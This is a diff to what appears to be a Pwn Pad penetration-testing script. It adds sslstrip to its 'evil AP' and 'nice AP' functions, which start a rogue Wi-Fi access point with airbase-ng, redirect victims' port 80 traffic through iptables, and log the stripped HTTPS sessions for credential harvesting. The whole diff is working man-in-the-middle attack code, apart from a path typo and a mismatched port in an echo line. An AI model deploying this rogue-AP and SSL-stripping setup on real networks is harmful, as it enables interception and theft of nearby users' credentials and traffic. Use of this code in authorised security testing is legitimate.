@@ -117,6 +117,8 @@ f_preplaunch(){
 f_evilap(){
   #Log path and name
   logname="/opt/pwnpad/captures/evilap/evilap-$(date +%s).log"
+  sslstripfilename=sslstrip$(date +%F-%H%M).log
+  DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"
 
   #Start Airbase-ng with -P for preferred networks 
   airbase-ng -P -C 30 -c 3 -e "$ssid" -v mon0 > $logname 2>&1 & 
@@ -136,14 +138,16 @@ f_evilap(){
   
   echo "Redirecting port 80 to 1000 SSLStrip interception"
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-  
-  tail -f $logname
+  echo "Running sslstrip..."
+  sslstrip -a -w /opt/pwnpad/catpures/$sslstripfilename &
 }
 
 #########################################
 f_niceap(){
   #Log path and name
   logname="/opt/pwnpad/captures/evilap/evilap-$(date +%s).log"
+  sslstripfilename=sslstrip$(date +%F-%H%M).log
+  DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"
 
   #Start Airbase-ng with -P for preferred networks 
   airbase-ng -C 30 -c 3 -e "$ssid" -v mon0 > $logname 2>&1 &
@@ -164,7 +168,9 @@ f_niceap(){
   
   echo "Redirecting port 80 to 1000 SSLStrip interception"
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-  
+ 
+  echo "Running sslstrip..."
+  sslstrip -a -w /opt/pwnpad/catpures/$sslstripfilename &
   tail -f $logname
 }
 
